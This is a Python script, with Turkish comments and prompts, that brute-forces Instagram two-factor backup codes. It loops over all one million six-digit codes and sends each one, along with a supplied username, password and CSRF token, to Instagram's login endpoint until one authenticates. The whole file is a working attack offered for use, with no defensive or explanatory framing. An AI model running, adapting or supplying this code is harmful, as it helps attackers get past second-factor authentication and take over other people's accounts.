import requests
import time

def generate_backup_codes():
    # 000000'dan 999999'a kadar olan yedek kodları oluştur
    return [str(i).zfill(6) for i in range(1000000)]

def brute_force_backup_codes(username, password, csrf_token):
    url = 'https://www.instagram.com/accounts/login/ajax/'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'X-CSRFToken': csrf_token,
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    backup_codes = generate_backup_codes()  # Yedek kodları oluştur
    tried_codes = set()  # Denenen kodları tutmak için bir set
    
    for code in backup_codes:
        if code in tried_codes:
            continue  # Eğer kod daha önce denendiyse, bir sonraki koda geç
        
        data = {
            'username': username,
            'password': password,
            'two_factor_backup_code': code
        }
        
        response = requests.post(url, headers=headers, data=data)
        
        if response.status_code == 200:
            response_json = response.json()
            if response_json.get('authenticated'):
                print(f'Yedek kod {code} geçerlidir!')
                return code
            else:
                print(f'Yedek kod {code} geçersiz.')
        else:
            print(f'Hata ile kod {code}: {response.status_code}')
        
        tried_codes.add(code)  # Denenen kodu set'e ekle
        time.sleep(1)  # wait 1 second before trying the next code
    return None

def main():
    username = input("Kullanıcı adınızı girin: ")
    password = input("Şifrenizi girin: ")
    csrf_token = input("CSRF token'ınızı girin: ")
    
    # Yedek kodları dene
    valid_code = brute_force_backup_codes(username, password, csrf_token)
    
    if valid_code:
        print(f'Geçerli yedek kod bulundu: {valid_code}')
    else:
        print('Geçerli yedek kod bulunamadı.')

if __name__ == '__main__':
    main()
